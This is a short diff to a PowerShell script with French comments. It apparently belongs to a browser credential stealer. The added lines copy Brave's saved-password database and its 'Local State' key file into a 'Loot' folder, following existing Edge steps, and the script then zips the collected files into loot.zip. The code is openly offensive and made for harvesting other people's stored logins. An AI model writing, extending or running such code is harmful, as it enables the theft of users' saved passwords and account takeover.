@@ -33,6 +33,13 @@ if (Test-Path "$edgeRoot\Local State") {
     Copy-Item "$edgeRoot\Local State" "Loot\Edge_Local_State" -EA 0
 }
 
+# Copier Brave
+if (Test-Path "$bravePath\Login Data") {
+    Copy-Item "$bravePath\Login Data" "Loot\Brave_Passwords.db" -EA 0
+}
+if (Test-Path "$braveRoot\Local State") {
+    Copy-Item "$braveRoot\Local State" "Loot\Brave_Local_State" -EA 0
+}
 
 # Compresser
 Compress-Archive -Path "Loot\*" -DestinationPath "loot.zip" -Force
